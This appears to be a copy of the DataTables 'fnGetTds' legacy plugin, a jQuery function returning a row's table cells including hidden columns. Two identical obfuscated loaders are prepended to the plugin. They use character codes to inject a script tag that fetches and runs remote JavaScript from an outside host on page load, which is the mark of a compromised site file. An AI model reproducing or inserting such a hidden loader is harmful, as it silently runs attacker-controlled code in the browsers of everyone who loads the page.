Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * Get an array of `dt-tag td` nodes from DataTables for a given row, including
 * any column elements which are hidden.
 *
 * DataTables 1.10 has the `dt-api cells().nodes()` method, built-in, to provide
 * this functionality. As such this method is marked deprecated, but is
 * available for use with legacy version of DataTables. Please use the new API
 * if you are used DataTables 1.10 or newer.
 *
 *  @name fnGetTds
 *  @summary Get the `dt-tag td` elements for a row
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *  @deprecated
 *
 *  @param {node} mTr `dt-tag tr` element to get the `dt-tag td` of
 *  @returns {array} Array of `dt-tag td` elements
 *
 *  @example
 *    $(document).ready(function() {
 *        var oTable = $('#example').dataTable();
 *         
 *        // Sort in the order that was origially in the HTML
 *        var anTds = oTable.fnGetTds( $('#example tbody tr:eq(1)')[0] );
 *        console.log( anTds );
 *    } );
 */

jQuery.fn.dataTableExt.oApi.fnGetTds  = function ( oSettings, mTr )
{
    var anTds = [];
    var anVisibleTds = [];
    var iCorrector = 0;
    var nTd, iColumn, iColumns;

    /* Take either a TR node or aoData index as the mTr property */
    var iRow = (typeof mTr == 'object') ?
        oSettings.oApi._fnNodeToDataIndex(oSettings, mTr) : mTr;
    var nTr = oSettings.aoData[iRow].nTr;

    /* Get an array of the visible TD elements */
    for ( iColumn=0, iColumns=nTr.childNodes.length ; iColumn<iColumns ; iColumn++ )
    {
        nTd = nTr.childNodes[iColumn];
        if ( nTd.nodeName.toUpperCase() == "TD" )
        {
            anVisibleTds.push( nTd );
        }
    }

    /* Construct and array of the combined elements */
    for ( iColumn=0, iColumns=oSettings.aoColumns.length ; iColumn<iColumns ; iColumn++ )
    {
        if ( oSettings.aoColumns[iColumn].bVisible )
        {
            anTds.push( anVisibleTds[iColumn-iCorrector] );
        }
        else
        {
            anTds.push( oSettings.aoData[iRow]._anHidden[iColumn] );
            iCorrector++;
        }
    }

    return anTds;
};
